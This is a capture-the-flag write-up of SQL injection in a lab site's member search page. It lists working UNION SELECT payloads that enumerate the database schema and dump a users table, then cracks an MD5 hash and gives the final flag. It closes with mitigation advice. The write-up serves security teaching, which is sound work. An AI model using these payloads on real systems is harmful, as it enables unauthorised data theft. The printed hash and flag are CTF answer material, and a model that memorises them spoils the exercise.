# SQL Injection In Member Search Field

## Issue

The input field at "http://{IP}:{PORT}/index.php?page=member" does not sanitize input data which is passed through to a database directly \
resulting in injection of query into SQL database.


## Attack Vector

1 - Navigating to "http://{IP}:{PORT}/index.php?page=member" and entering arbitrary payload eg `' or 1=1` into input field and selecting submit 
reveals SQL syntax error message confirming that data is being passed into query without sanitization

2 - Identify Schemas in database by inputting `4 UNION SELECT null,schema_name from INFORMATION_SCHEMA.SCHEMATA-- -` - we see interesting schema `Member_Sql_Injection` \
Note - as there are only 2 columns being returned/rendered by the server during a normal query then union select needs to only reference 2 columns during query!

3 - Identify the tables in `Member_Sql_Injection` schema with `4 UNION SELECT TABLE_SCHEMA, TABLE_NAME FROM INFORMATION_SCHEMA.COLUMNS -- -` which reveals table name `users`

4 - Identify all columns in Users table in Member_Sql_Injection with  `4 UNION SELECT COLUMN_NAME, TABLE_SCHEMA FROM INFORMATION_SCHEMA.COLUMNS -- -`

5 - Column names `user_id, first_name, last_name, town, country, planet, Commentaire, countersign` are revealed

6 - Query each column in Users table with `4 UNION SELECT {column_name},{column_name} FROM Member_Sql_Injection.users -- -`

7 - After querying all columns we see one particular interesting entry in the 'Users' table as follows:
| **Column name**  | user_id | first_name | last_name | town | country | planet | Commentaire                                               | countersign                               |
|--------------|---------|------------|-----------|------|---------|--------|-----------------------------------------------------------|------------------------------------------|
| **Data**         | 5       | Flag       | GetThe    | 42   | 42      | 42     | Decrypt this password -> then lower all the char. Sh256 on it and it's good ! | 5ff9d0165b4f92b14994e5c685cdce28        |

8 - Open bash and navigate to script directory. Launch script with `python3 hashcracker.py` to attempt to crack md5 hash against the passwordlist.txt word list

9 - The decrypted hash is found to be `FortyTwo`

10 - We follow the instructions as per table contents and lowercase the word `FortyTwo` then apply a SHA256 algorithm to reveal the flag.

11 - Flag is `10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5`

*NOTE - You can use existing MD5 decryption tools such as MD5decrypt.net to attempt to crack the hash.*


## Mitigation

1 - Sanitize and validate input

2 - Use ORM framework to make queries to database

3 - Do not expose raw SQL error messages




